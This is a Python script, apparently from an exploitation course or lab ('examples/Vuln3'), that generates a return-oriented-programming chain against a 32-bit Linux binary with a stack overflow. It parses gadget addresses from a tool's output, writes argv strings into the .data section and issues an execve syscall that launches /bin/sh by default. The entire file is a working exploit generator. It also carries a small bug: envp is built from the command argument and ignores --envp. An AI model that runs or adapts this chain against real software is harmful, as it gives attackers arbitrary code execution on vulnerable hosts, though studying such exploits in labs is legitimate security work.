#!/usr/bin/env python3

import re
import sys
import argparse
from pathlib import Path
from struct import pack


parser = argparse.ArgumentParser(
    description="",
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
)
parser.add_argument("--command", default="/bin/sh")
parser.add_argument("--envp", default="")
parser.add_argument("--out-rop-path", default=Path("examples/Vuln3/Vuln3-32/out-rop.txt"))


def main(args):
    argv = args.command.split()
    envp = args.command.split()

    gadgets, data_address = parse_out_rop(Path(args.out_rop_path))

    # Add padding
    rop_chain = b'A'*44

    # Push argv and envp
    rop_chain, stack_ptr, argv_ptr = push_array_of_strings(argv, gadgets, data_address, rop_chain)
    rop_chain, stack_ptr, envp_ptr = push_array_of_strings(envp, gadgets, stack_ptr, rop_chain)

    rop_chain += pack('<I', gadgets[": pop ecx ; pop ebx ; ret"])
    rop_chain += pack('<I', argv_ptr)  # Put argv in ecx
    rop_chain += pack('<I', data_address)  # Put filename in ebx

    # Put envp in edx
    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
    rop_chain += pack('<I', envp_ptr)

    # Set eax to 11
    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
    for _ in range(11):
        rop_chain += pack('<I', gadgets[": inc eax ; ret"])

    rop_chain += pack('<I', gadgets[": int 0x80"])  # Syscall

    sys.stdout.buffer.write(rop_chain)


def parse_out_rop(path: Path):
    rop_gadgets = {
        ": mov dword ptr [edx], eax ; ret": None,
        ": pop edx ; ret": None,
        ": pop eax ; ret": None,
        ": xor eax, eax ; ret": None,
        ": inc eax ; ret": None,
        ": pop ebx ; ret": None,
        ": pop ecx ; pop ebx ; ret": None,
        ": int 0x80": None,
    }

    data_address = None
    data_addr_pat = re.compile(r",\s*([^)]*)")

    with open(path) as out_rop:
        for line in out_rop:
            if ".data" in line and data_address is None:
                match = data_addr_pat.search(line)
                if match:
                    extracted_part = match.group(1)
                    data_address = int(extracted_part, 16)

            elif any(gadget in line for gadget in rop_gadgets.keys()):
                tokens = line.split()
                gadget_key = ' '.join(tokens[1:])
                rop_gadgets[gadget_key] = int(tokens[0], 16)

    return rop_gadgets, data_address


def push_array_of_strings(array, gadgets, data_address, rop_chain):
    stack_pointer = data_address
    pointers = []

    for string in array:
        # Keep track of where this string is on the stack.
        pointers.append(stack_pointer)
        # Split string into chunks of size 4.
        chunks = [string[i:i+4] for i in range(0, len(string), 4)]
        # If the chunk isn't big enough, pad it with null characters.
        chunks = [chunk.ljust(4, '\0') for chunk in chunks]

        # Push chunks onto the stack.
        for chunk in chunks:
            rop_chain += push_string(gadgets, stack_pointer, chunk.encode('utf-8'))
            stack_pointer += 4
        # Terminate strings with null.
        rop_chain += push_null(gadgets, stack_pointer)
        stack_pointer += 4

    array_pointer = stack_pointer
    # Push pointers to strings onto the stack.
    for pointer in pointers:
        rop_chain += push_item(gadgets, stack_pointer, pointer)
        stack_pointer += 4
    # Terminate the array of pointers with null.
    rop_chain += push_null(gadgets, stack_pointer)
    stack_pointer += 4

    return rop_chain, stack_pointer, array_pointer


def push_string(gadgets, stack_pointer, string):
    rop_chain = b''
    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
    rop_chain += pack('<I', stack_pointer)
    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
    rop_chain += string
    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
    return rop_chain


def push_item(gadgets, stack_pointer, item):
    rop_chain = b''
    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
    rop_chain += pack('<I', stack_pointer)
    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
    rop_chain += pack('<I', item)
    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
    return rop_chain


def push_null(gadgets, stack_pointer):
    rop_chain = b''
    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
    rop_chain += pack('<I', stack_pointer)
    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
    rop_chain += pack('<I', gadgets[": mov dword ptr [edx], eax ; ret"])
    return rop_chain


if __name__ == "__main__":
    main(parser.parse_args())
